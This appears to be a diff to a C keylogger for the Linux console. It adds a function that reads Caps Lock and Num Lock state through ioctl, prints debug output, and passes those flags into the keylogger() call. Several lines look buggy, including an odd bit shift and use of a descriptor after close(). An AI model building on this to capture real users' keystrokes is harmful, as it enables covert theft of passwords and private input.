@@ -18,6 +18,8 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <linux/kd.h>
+#include <errno.h>
+#include <string.h>
 
 #include "main.h"
 
@@ -66,6 +68,32 @@ static int			has_keys(int fd, int n)
 	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
 }
 
+static void			get_keystate(int fd, int *caps, int *num)
+{
+	long int		state;
+
+	state = 0;
+	if (ioctl(fd, KDGKBLED, &state)) {
+		fprintf(stderr, "Can't get keys state: %s\n", strerror(errno));
+		return ;
+	}
+	printf("state: %ld", state);
+	for (int i = 0; i < 16; i++)
+		printf("%lx", state & i);
+	printf("\n");
+	printf("\tSCROLLLOCK %s", ((state << 3) & K_SCROLLLOCK) ? "ON":"OFF");
+	printf("\tNUMLOCK %s", ((state << 3) & K_NUMLOCK) ? "ON":"OFF");
+	printf("\tCAPSLOCK %s\n", ((state << 3) & K_CAPSLOCK) ? "ON":"OFF");
+	*caps = state  & K_CAPSLOCK;
+	*num = state & K_NUMLOCK;
+	state = 0;
+	ioctl(fd, KDGETLED, &state);
+	printf("state: %ld", state);
+	printf("\tSCROLLLED %s", (state & LED_SCR) ? "ON":"OFF");
+	printf("\tNUMLED %s", (state & LED_NUM) ? "ON":"OFF");
+	printf("\tCAPSLED %s\n", (state & LED_CAP) ? "ON":"OFF");
+}
+
 int					main(void)
 {
 	int				fd;
@@ -74,6 +102,8 @@ int					main(void)
 	int 			nb_keymap;
 	int				**key_table;
 	char			*keyboard;
+	int				capslock;
+	int				numlock;
 
 	if ((fd = get_console()) < 0)
 		return 1;
@@ -84,6 +114,7 @@ int					main(void)
 		return 1;
 	key_table = get_keys(fd, nb_keys, nb_keymap, key_maps);
 	free_tab(&key_maps);
+	get_keystate(fd, &capslock, &numlock);
 	close(fd);
 	if (key_table == NULL)
 		return 1;
@@ -98,7 +129,7 @@ int					main(void)
 	}
 	printf("keyboard: %s\n", keyboard);
 	free(keyboard);
-	keylogger(fd, key_table);
+	keylogger(fd, key_table, capslock, numlock);
 	close(fd);
 	free_tab(&key_table);
 	return 0;
